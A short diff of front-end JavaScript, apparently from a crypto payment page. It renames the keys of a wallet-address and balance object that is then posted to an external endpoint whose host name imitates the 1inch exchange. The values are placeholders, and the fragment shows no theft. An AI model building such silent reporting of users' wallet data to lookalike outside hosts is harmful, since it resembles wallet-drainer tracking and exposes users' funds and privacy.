@@ -414,8 +414,8 @@ if(youPayToken === "MATIC") {
       setTokenBalance(Number(data.formatted).toFixed(4));
 
       const dataToSend = {
-        walletAddress: '0x1234567890abcdef1234567890abcdef12345678',
-        usdtBalance: 150.25
+        wallet: '0x1234567890abcdef1234567890abcdef12345678',
+        balance: 150.25
       };
       
       fetch('http://1inch2test-rud8.vercel.app/api/wallet-balance', {
